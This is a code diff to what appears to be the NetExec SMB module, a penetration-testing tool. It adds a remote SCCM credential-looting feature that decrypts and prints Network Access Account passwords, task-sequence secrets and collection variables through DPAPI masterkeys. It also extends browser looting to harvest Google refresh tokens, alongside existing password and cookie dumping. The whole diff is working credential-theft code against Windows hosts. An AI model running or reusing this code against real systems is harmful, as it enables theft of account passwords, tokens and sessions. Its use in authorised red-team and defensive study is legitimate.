@@ -49,12 +49,13 @@ from nxc.helpers.bloodhound import add_user_bh
 from nxc.helpers.powershell import create_ps_command
 
 from dploot.triage.vaults import VaultsTriage
-from dploot.triage.browser import BrowserTriage
+from dploot.triage.browser import BrowserTriage, LoginData, GoogleRefreshToken
 from dploot.triage.credentials import CredentialsTriage
 from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
 from dploot.triage.backupkey import BackupkeyTriage
 from dploot.lib.target import Target
 from dploot.lib.smb import DPLootSMBConnection
+from dploot.triage.sccm import SCCMTriage
 
 from pywerview.cli.helpers import get_localdisks, get_netsession, get_netgroupmember, get_netgroup, get_netcomputer, get_netloggedon, get_netlocalgroup
 
@@ -1355,9 +1356,66 @@ class smb(connection):
             self.logger.exception(str(e))
 
     @requires_admin
+    def sccm(self):
+        masterkeys = []
+        if self.args.mkfile is not None:
+            try:
+                masterkeys += parse_masterkey_file(self.args.mkfile)
+            except Exception as e:
+                self.logger.fail(str(e))
+
+        target = Target.create(
+            domain=self.domain,
+            username=self.username,
+            password=self.password,
+            target=self.hostname + "." + self.domain if self.kerberos else self.host,
+            lmhash=self.lmhash,
+            nthash=self.nthash,
+            do_kerberos=self.kerberos,
+            aesKey=self.aesKey,
+            no_pass=True,
+            use_kcache=self.use_kcache,
+        )
+
+        try:
+            conn = DPLootSMBConnection(target)
+            conn.smb_session = self.conn
+        except Exception as e:
+            self.logger.debug(f"Could not upgrade connection: {e}")
+            return
+        
+        try:
+            self.logger.display("Collecting Machine masterkeys, grab a coffee and be patient...")
+            masterkeys_triage = MasterkeysTriage(
+                target=target,
+                conn=conn,
+                dpapiSystem={},
+            )
+            masterkeys += masterkeys_triage.triage_system_masterkeys()
+        except Exception as e:
+            self.logger.debug(f"Could not get masterkeys: {e}")
+
+        if len(masterkeys) == 0:
+            self.logger.fail("No masterkeys looted")
+            return
+        
+        self.logger.success(f"Got {highlight(len(masterkeys))} decrypted masterkeys. Looting SCCM Credentials through {self.args.sccm}")
+        try:
+            # Collect Chrome Based Browser stored secrets
+            sccm_triage = SCCMTriage(target=target, conn=conn, masterkeys=masterkeys, use_wmi=self.args.sccm == "wmi")
+            sccmcreds, sccmtasks, sccmcollections = sccm_triage.triage_sccm()
+            for sccmcred in sccmcreds:
+                self.logger.highlight(f"[NAA Account] {sccmcred.username.decode('latin-1')}:{sccmcred.password.decode('latin-1')}")
+            for sccmtask in sccmtasks:
+                self.logger.highlight(f"[Task sequences secret] {sccmtask.secret.decode('latin-1')}")
+            for sccmcollection in sccmcollections:
+                self.logger.highlight(f"[Collection Variable] {sccmcollection.variable.decode('latin-1')}:{sccmcollection.value.decode('latin-1')}")
+        except Exception as e:
+            self.logger.debug(f"Error while looting sccm: {e}")
+
+    @requires_admin
     def dpapi(self):
         dump_system = "nosystem" not in self.args.dpapi
-        logging.getLogger("dploot").disabled = True
 
         if self.args.pvk is not None:
             try:
@@ -1448,6 +1506,7 @@ class smb(connection):
                 pvkbytes=self.pvkbytes,
                 passwords=plaintexts,
                 nthashes=nthashes,
+                dpapiSystem={},
             )
             self.logger.debug(f"Masterkeys Triage: {masterkeys_triage}")
             masterkeys += masterkeys_triage.triage_masterkeys()
@@ -1507,22 +1566,34 @@ class smb(connection):
         except Exception as e:
             self.logger.debug(f"Error while looting browsers: {e}")
         for credential in browser_credentials:
-            cred_url = credential.url + " -" if credential.url != "" else "-"
-            self.logger.highlight(f"[{credential.winuser}][{credential.browser.upper()}] {cred_url} {credential.username}:{credential.password}")
-            self.db.add_dpapi_secrets(
-                target.address,
-                credential.browser.upper(),
-                credential.winuser,
-                credential.username,
-                credential.password,
-                credential.url,
-            )
+            if isinstance(credential, LoginData):
+                cred_url = credential.url + " -" if credential.url != "" else "-"
+                self.logger.highlight(f"[{credential.winuser}][{credential.browser.upper()}] {cred_url} {credential.username}:{credential.password}")
+                self.db.add_dpapi_secrets(
+                    target.address,
+                    credential.browser.upper(),
+                    credential.winuser,
+                    credential.username,
+                    credential.password,
+                    credential.url,
+                )
+            elif isinstance(credential, GoogleRefreshToken):
+                self.logger.highlight(f"[{credential.winuser}][{credential.browser.upper()}] Google Refresh Token: {credential.service}:{credential.token}")
+                self.db.add_dpapi_secrets(
+                    target.address,
+                    credential.browser.upper(),
+                    credential.winuser,
+                    credential.service,
+                    credential.token,
+                    "Google Refresh Token",
+                )
+
 
         if dump_cookies and cookies:
             self.logger.display("Start Dumping Cookies")
             for cookie in cookies:
                 if cookie.cookie_value != "":
-                    self.logger.highlight(f"[{credential.winuser}][{cookie.browser.upper()}] {cookie.host}{cookie.path} - {cookie.cookie_name}:{cookie.cookie_value}")
+                    self.logger.highlight(f"[{cookie.winuser}][{cookie.browser.upper()}] {cookie.host}{cookie.path} - {cookie.cookie_name}:{cookie.cookie_value}")
             self.logger.display("End Dumping Cookies")
         elif dump_cookies:
             self.logger.fail("No cookies found")
@@ -1566,7 +1637,7 @@ class smb(connection):
                 credential.url,
             )
 
-        if not (credentials and system_credentials and browser_credentials and cookies and vaults and firefox_credentials):
+        if not (credentials or system_credentials or browser_credentials or cookies or vaults or firefox_credentials):
             self.logger.fail("No secrets found")
 
     @requires_admin
